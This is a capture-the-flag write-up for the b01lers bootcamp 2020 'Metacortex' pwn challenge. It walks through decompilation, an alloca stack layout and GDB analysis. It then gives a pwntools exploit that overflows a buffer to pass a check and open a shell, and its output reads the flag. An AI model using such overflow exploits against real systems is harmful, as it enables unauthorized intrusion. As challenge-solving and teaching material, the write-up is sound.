# b01lers bootcamp CTF 2020

## Metacortex

> 100
>
> This company is one of the top software companies in the world, because every single employee knows that they are part of a whole. Thus, if an employee has a problem, the company has a problem.
> 
> `nc chal.ctf.b01lers.com 1014`
> 
> [metacortex](metacortex)

Tags: _pwn_ _x86-64_ _remote-shell_ _bof_ _alloca_


## Summary

Classic buffer overflow from one variable to another to pass a check, however `alloca` adds a small twist.
 

## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Nice!  All mitigations in place.


### Decompile with Ghidra

```c
undefined8 main(void)
{
  long lVar1;
  int iVar2;
  undefined *puVar3;
  undefined *puVar4;
  long in_FS_OFFSET;
  undefined auStack56 [8];
  long *local_30;
  ulong local_28;
  long local_20;
  
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  puVar3 = auStack56;
  while (puVar3 != auStack56) {
    *(undefined8 *)(puVar3 + -8) = *(undefined8 *)(puVar3 + -8);
    puVar3 = puVar3 + -0x1000;
  }
  *(undefined8 *)(puVar3 + -8) = *(undefined8 *)(puVar3 + -8);
  local_30 = (long *)((ulong)(puVar3 + -1) & 0xfffffffffffffff0);
  puVar4 = puVar3 + -0x10;
  while (puVar4 != puVar3 + -0x10) {
    *(undefined8 *)(puVar4 + -8) = *(undefined8 *)(puVar4 + -8);
    puVar4 = puVar4 + -0x1000;
  }
  *(undefined8 *)(puVar4 + -8) = *(undefined8 *)(puVar4 + -8);
  local_28 = (ulong)(puVar4 + -0x41) & 0xfffffffffffffff0;
  *(long *)((ulong)(puVar3 + -1) & 0xfffffffffffffff0) = 0x1011e9;
  *(undefined8 *)(puVar4 + -0x58) = 0x101365;
  puts("Work for the respectable software company, Neo.",puVar4[-0x58]);
  *(undefined8 *)(puVar4 + -0x58) = 0x10137b;
  read(0,local_28,0x80,puVar4[-0x58]);
  lVar1 = *local_30;
  *(undefined8 *)(puVar4 + -0x58) = 0x101395;
  iVar2 = atoi(local_28,puVar4[-0x58]);
  if (lVar1 >> 0x20 == (long)iVar2) {
    *(undefined8 *)(puVar4 + -0x58) = 0x1013a8;
    system("/bin/sh",puVar4[-0x58]);
  }
  if (local_20 == *(long *)(in_FS_OFFSET + 0x28)) {
    return 0;
  }
                    /* WARNING: Subroutine does not return */
  *(undefined8 *)(puVar4 + -0x58) = 0x1013c1;
  __stack_chk_fail();
}
```

To get a shell we need to pass this check: `if (lVar1 >> 0x20 == (long)iVar2) {`.

Following along the decompilation was not very helpful, however the disassembly...

```
00101258 48 f7 f6        DIV        RSI
0010125b 48 6b c0 10     IMUL       RAX,RAX,0x10
0010125f 48 89 c2        MOV        RDX,RAX
00101262 48 81 e2        AND        RDX,-0x1000
         00 f0 ff ff
```

This pattern is from `alloca`.  Think `malloc`, but in stack.

Also note that `local_28` is a pointer (see above), below `local_28` is set from `alloca`:

```c
  local_28 = (ulong)(puVar4 + -0x41) & 0xfffffffffffffff0;
  *(long *)((ulong)(puVar3 + -1) & 0xfffffffffffffff0) = 0x1011e9;
  *(undefined8 *)(puVar4 + -0x58) = 0x101365;
  puts("Work for the respectable software company, Neo.",puVar4[-0x58]);
  *(undefined8 *)(puVar4 + -0x58) = 0x10137b;
  read(0,local_28,0x80,puVar4[-0x58]);
```

At this point instead of trying to figure out the math statically, I opted to use GDB; set a breakpoint just before the read and after the read, and then looked at the stack:

```
gef➤  b *main+397
Breakpoint 1 at 0x1376
gef➤  b *main+402
Breakpoint 2 at 0x137b
gef➤  gef config context.nb_lines_stack 32
gef➤  r
``` 

Stack after `read`:

```
0x00007fffffffe2c0│+0x0000: "AAAAAAAA\n"	 ← $rsp, $rsi
0x00007fffffffe2c8│+0x0008: 0x000000000000000a
0x00007fffffffe2d0│+0x0010: 0x00007ffff7fae4a0  →  0x0000000000000000
0x00007fffffffe2d8│+0x0018: 0x00007ffff7e526bd  →  <_IO_file_setbuf+13> test rax, rax
0x00007fffffffe2e0│+0x0020: 0x00007ffff7fad5c0  →  0x00000000fbad2087
0x00007fffffffe2e8│+0x0028: 0x00007ffff7e48f65  →  <setvbuf+261> xor r8d, r8d
0x00007fffffffe2f0│+0x0030: 0x00005555555553d0  →  <__libc_csu_init+0> endbr64
0x00007fffffffe2f8│+0x0038: 0x00007fffffffe350  →  0x0000000000000000
0x00007fffffffe300│+0x0040: 0x0000555555555100  →  <_start+0> endbr64
0x00007fffffffe308│+0x0048: 0x00007fffffffe440  →  0x0000000000000001
0x00007fffffffe310│+0x0050: 0x00005555555551e9  →  <main+0> endbr64 	 ← $rbx
0x00007fffffffe318│+0x0058: 0x0000555555555241  →  <main+88> mov eax, 0x10
0x00007fffffffe320│+0x0060: 0x00007ffff7fb1fc8  →  0x0000000000000000
0x00007fffffffe328│+0x0068: 0x00007fffffffe310  →  0x00005555555551e9  →  <main+0> endbr64
0x00007fffffffe330│+0x0070: 0x00007fffffffe2c0  →  "AAAAAAAA\n"
0x00007fffffffe338│+0x0078: 0x80214a39ea503000
0x00007fffffffe340│+0x0080: 0x00007fffffffe440  →  0x0000000000000001
0x00007fffffffe348│+0x0088: 0x00005555555553d0  →  <__libc_csu_init+0> endbr64
0x00007fffffffe350│+0x0090: 0x0000000000000000	 ← $rbp
0x00007fffffffe358│+0x0098: 0x00007ffff7de80b3  →  <__libc_start_main+243> mov edi, eax
```

`local_28` (`+0x70`) is pointing `0x90` above `$rbp`.  

> `local_28` is `0x28` above the return address (thanks Ghidra), making it `0x20` above `$rbp`, since `$rbp` is at `+0x90`, subtract `0x20` to find `local_28` in stack (`+0x70`).  Notice is value is pointing to `0x00007fffffffe2c0` (`+0x00`).

The compare is with `local_30` (see the decompile where `lVar1` is set to `*local_30`).  `local_30` is `0x30+8` from `$rbp` (`local_30` in Ghidra is `0x30` from the return address and `$rbp` is just above that).  Since `0x90 - 0x30 + 8 = 104`, if we write `104` bytes we'll overwrite `local_30` and control the compare.

The `read` liberally allows `0x80` (128) bytes, so we're good here.  A payload of a `0` + 103 nulls should get us a shell.

The `0` is for the `atoi`.  `atoi` will stop at the first null.  The nulls in `local_30` give us a matching zero.


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./metacortex')
context.log_level = 'INFO'

if not args.REMOTE:
    context.log_file = 'local.log'
    p = process(binary.path)
else:
    context.log_file = 'remote.log'
    p = remote('chal.ctf.b01lers.com', 1014)

payload = b'0' + 103 * b'\0'

p.sendafter('Work for the respectable software company, Neo.\n',payload)
p.interactive()
```

Output:

```
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/b01lersbootcampctf2020/metacortex/metacortex'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to chal.ctf.b01lers.com on port 1014: Done
[*] Switching to interactive mode
$ id
uid=1000(metacortex) gid=1000(metacortex) groups=1000(metacortex)
$ ls -l
total 36
-r-xr-x--- 1 root metacortex    66 Oct  2 15:31 Makefile
-r--r----- 1 root metacortex    28 Oct  2 15:31 flag.txt
-r-xr-x--- 1 root metacortex 17040 Oct  3 04:07 metacortex
-r-xr-x--- 1 root metacortex   396 Oct  2 15:31 metacortex.c
-r-xr-x--- 1 root metacortex    49 Oct  2 15:31 wrapper.sh
$ cat flag.txt
flag{Ne0_y0uAre_d0ing_well}
```